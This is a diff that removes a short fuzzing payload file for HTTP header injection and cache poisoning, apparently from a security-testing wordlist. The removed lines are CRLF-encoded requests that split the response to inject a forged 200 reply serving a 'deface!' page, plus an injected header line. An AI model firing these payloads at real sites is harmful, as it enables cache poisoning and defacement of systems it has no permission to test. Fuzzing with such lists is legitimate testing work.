@@ -1,5 +1,0 @@
-# Header Injection / Cache Poison 1.0  (fuzz the entire get req) (12 April 2010)
-# creative commons license http://creativecommons.org/licenses/by/3.0/
-# projurl
-GET http://{SITE}testsite.com/redir.php?site=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1GET http://{SITE}/{REDIRECTURL}?site=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
-%0d%0aX-Injection-Header:%20AttackValue
